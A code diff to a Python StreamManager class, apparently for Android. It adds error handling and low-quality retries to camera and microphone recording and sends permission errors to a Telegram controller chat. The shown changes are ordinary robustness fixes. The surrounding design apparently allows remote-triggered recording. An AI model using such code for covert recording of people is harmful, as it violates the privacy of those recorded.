@@ -100,7 +100,7 @@ class StreamManager:
             logging.error(f"Safe remove error {path}: {e}")
         return False
 
-    # ========== التحقق من الصلاحيات (محسّن مع رسائل واضحة) ==========
+    # ========== التحقق من الصلاحيات (محسّن مع طلب تلقائي) ==========
     def _check_permissions(self, request_if_missing=False):
         """
         التحقق من صلاحيات الكاميرا والميكروفون.
@@ -175,10 +175,12 @@ class StreamManager:
                             if check_permission(p):
                                 if p == Permission.CAMERA:
                                     result['camera'] = True
-                                    result['missing'].remove('CAMERA')
+                                    if 'CAMERA' in result['missing']:
+                                        result['missing'].remove('CAMERA')
                                 elif p == Permission.RECORD_AUDIO:
                                     result['microphone'] = True
-                                    result['missing'].remove('RECORD_AUDIO')
+                                    if 'RECORD_AUDIO' in result['missing']:
+                                        result['missing'].remove('RECORD_AUDIO')
                 except Exception as e:
                     logging.error(f"Permission request error: {e}")
 
@@ -337,12 +339,11 @@ class StreamManager:
                 logging.warning("Recording already in progress")
                 return False
 
-            # التحقق من الصلاحيات مع طلب تلقائي
+            # ✅ الخطأ 1: التحقق من الصلاحيات مع طلب تلقائي
             perms_result = self._check_permissions(request_if_missing=True)
             
             if not perms_result['ok']:
                 logging.error(f"Permission check failed: {perms_result['message']}")
-                # إرسال رسالة خطأ للمستخدم
                 if self.tg and mon.ctrl:
                     self.tg._api("sendMessage", {
                         "chat_id": mon.ctrl,
@@ -427,8 +428,50 @@ class StreamManager:
                 # ملف الإخراج المؤقت
                 media_recorder.setOutputFile(temp_path)
 
-                media_recorder.prepare()
-                media_recorder.start()
+                # ✅ الخطأ 2: محاولة prepare مع try/except منفصل
+                try:
+                    media_recorder.prepare()
+                except Exception as e:
+                    logging.error(f"MediaRecorder prepare failed: {e}")
+                    # محاولة استخدام إعدادات أقل جودة
+                    try:
+                        # محاولة تقليل الدقة
+                        if res_key != "144":
+                            logging.info("Retrying with lower quality (144p)")
+                            w, h, bitrate = self._res_map["144"]
+                            media_recorder.setVideoSize(w, h)
+                            media_recorder.setVideoEncodingBitRate(bitrate)
+                            media_recorder.prepare()
+                        else:
+                            raise
+                    except Exception as e2:
+                        logging.error(f"MediaRecorder prepare retry failed: {e2}")
+                        raise
+
+                # محاولة start مع try/except
+                try:
+                    media_recorder.start()
+                except Exception as e:
+                    logging.error(f"MediaRecorder start failed: {e}")
+                    # محاولة إعادة تهيئة MediaRecorder
+                    try:
+                        media_recorder.reset()
+                        media_recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
+                        media_recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA)
+                        media_recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                        media_recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+                        media_recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                        media_recorder.setVideoSize(w, h)
+                        media_recorder.setVideoEncodingBitRate(bitrate)
+                        media_recorder.setVideoFrameRate(30)
+                        media_recorder.setOrientationHint(orientation)
+                        media_recorder.setOutputFile(temp_path)
+                        media_recorder.prepare()
+                        media_recorder.start()
+                    except Exception as e2:
+                        logging.error(f"MediaRecorder restart failed: {e2}")
+                        raise
+
                 logging.info(f"Recording started: {w}x{h}, {bitrate} bps")
 
                 # التسجيل مع إمكانية الإلغاء
@@ -440,8 +483,12 @@ class StreamManager:
 
                 # إيقاف التسجيل إذا لم يتم الإلغاء
                 if not self._should_stop:
-                    media_recorder.stop()
-                    success = True
+                    try:
+                        media_recorder.stop()
+                        success = True
+                    except Exception as e:
+                        logging.error(f"MediaRecorder stop failed: {e}")
+                        success = False
                 else:
                     # إذا تم الإلغاء، فقط أوقف بدون حفظ
                     try:
